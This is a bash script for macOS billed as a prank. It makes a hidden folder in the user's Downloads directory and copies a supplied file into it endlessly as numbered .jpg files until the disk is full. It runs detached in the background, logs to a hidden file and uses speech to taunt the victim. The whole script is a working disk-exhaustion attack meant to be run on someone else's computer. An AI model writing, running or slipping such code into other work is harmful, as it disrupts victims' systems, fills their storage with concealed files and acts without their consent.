#!/bin/bash

# Karan's Ultimate Prank v3.5 - ABSOLUTE FINAL WORKING EDITION
# GUARANTEED to work - no overlapping voices, actual duplication

VERSION="3.5.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
BOLD='\033[1m'; BLINK='\033[5m'; BG_GREEN='\033[42m'
WHITE='\033[1;37m'; NC='\033[0m'

# Funny messages
MESSAGES=(
    "🎪 Welcome to Karan's digital circus!"
    "🔥 Disk space is overrated anyway..."
    "💀 Your storage is about to meet its maker!"
    "⚡ Faster than your regrets!"
    "🌪️ Creating digital chaos..."
    "🎯 Bullseye! Another file bites the dust!"
    "🚀 To infinity and beyond your storage!"
    "💎 Every copy is a precious gem!"
    "🔮 Predicting your future: No storage left!"
    "🎨 Painting your disk full!"
    "🎵 Can you hear the hard drive crying?"
    "🍕 Like pizza slices, but for your disk!"
    "🌟 Making your disk famous, one file at a time!"
    "🎭 This is my masterpiece!"
)

# Setup directory
setup() {
    mkdir -p "$HIDDEN_DIR"
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
}

# Print with logging
log_msg() {
    echo -e "${1}${2}${NC}"
    echo "$(date): $2" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Random funny message
funny_msg() {
    local msg=${MESSAGES[$RANDOM % ${#MESSAGES[@]}]}
    local colors=("$RED$BOLD" "$GREEN$BOLD" "$YELLOW$BOLD" "$BLUE$BOLD" "$PURPLE$BOLD" "$CYAN$BOLD")
    local color=${colors[$RANDOM % ${#colors[@]}]}
    log_msg "$color$BLINK" "$msg"
}

# FIXED: Single audio function to prevent overlap
play_audio() {
    # Kill any existing audio processes first
    pkill -f "say" 2>/dev/null || true
    sleep 0.1
    
    osascript -e "set volume output volume 85" 2>/dev/null || true
    say "$1" 2>/dev/null
    wait
}

# MAIN DUPLICATION FUNCTION
duplicate_files() {
    local payload="$1"
    local counter=0
    
    # Copy payload
    cp "$payload" "$HIDDEN_DIR/.payload"
    
    log_msg "$PURPLE$BOLD$BLINK" "🎭 Karan's Ultimate Prank v3.5 - FINAL WORKING EDITION!"
    log_msg "$CYAN$BOLD" "⚡ Lightning speed duplication starting NOW!"
    
    # Audio startup (no overlap)
    play_audio "Ding dong! Karan's ultimate prank starts now!"
    play_audio "Prepare for storage annihilation!"
    
    log_msg "$RED$BOLD$BLINK" "🚀 INITIATING LIGHT-SPEED DIGITAL WARFARE!"
    funny_msg
    
    # MAIN DUPLICATION LOOP - This is where the magic happens
    while true; do
        local target_file="$HIDDEN_DIR/karan_ultimate_$(printf "%08d" $counter).jpg"
        
        # Try to copy - if it fails, disk is full
        if ! cp "$HIDDEN_DIR/.payload" "$target_file" 2>/dev/null; then
            log_msg "$PURPLE$BOLD$BLINK" "💾 DISK FULL! Created $counter files total!"
            play_audio "Mission accomplished! Created $counter files!"
            break
        fi
        
        counter=$((counter + 1))
        
        # Funny messages every 50 files
        if [[ $((counter % 50)) -eq 0 ]]; then
            funny_msg
        fi
        
        # Progress every 200 files
        if [[ $((counter % 200)) -eq 0 ]]; then
            log_msg "$BG_GREEN$WHITE$BOLD" "💥 DESTRUCTION LEVEL: $counter files eliminated!"
        fi
        
        # Milestones with SINGLE audio (no overlap)
        case $counter in
            1000)
                log_msg "$YELLOW$BOLD$BLINK" "🎉 FIRST THOUSAND! LEGENDARY!"
                play_audio "One thousand files! You're in trouble!"
                ;;
            5000)
                log_msg "$RED$BOLD$BLINK" "🔥 FIVE THOUSAND! UNSTOPPABLE!"
                play_audio "Five thousand files! Storage is screaming!"
                ;;
            10000)
                log_msg "$PURPLE$BOLD$BLINK" "💎 TEN THOUSAND! MAXIMUM CHAOS!"
                play_audio "Ten thousand files! Digital apocalypse!"
                ;;
        esac
    done
    
    log_msg "$PURPLE$BOLD$BLINK" "🏆 ULTIMATE VICTORY! Final count: $counter files!"
}

# Validate system and payload
validate() {
    if [[ "$(uname)" != "Darwin" ]]; then
        echo "💀 ERROR: macOS required!"
        exit 1
    fi
    
    if [[ ! -f "$1" ]]; then
        echo "🔍 ERROR: Payload file not found!"
        exit 1
    fi
}

# MAIN EXECUTION
main() {
    local payload="$1"
    validate "$payload"
    setup
    
    # Start duplication immediately
    duplicate_files "$payload"
}

# EXECUTION LOGIC
if [[ "$2" == "--run" ]]; then
    # Background execution - run the actual prank
    exec >> "$HIDDEN_DIR/.log" 2>&1
    main "$1"
else
    # Launch message and start background
    echo -e "${GREEN}${BOLD}🚀 Ultimate Prank v3.5 launched!${NC}"
    echo -e "${PURPLE}${BOLD}⚡ Duplication starting immediately!${NC}"
    
    # Start the actual duplication in background
    "$0" "$1" --run &
    disown
fi
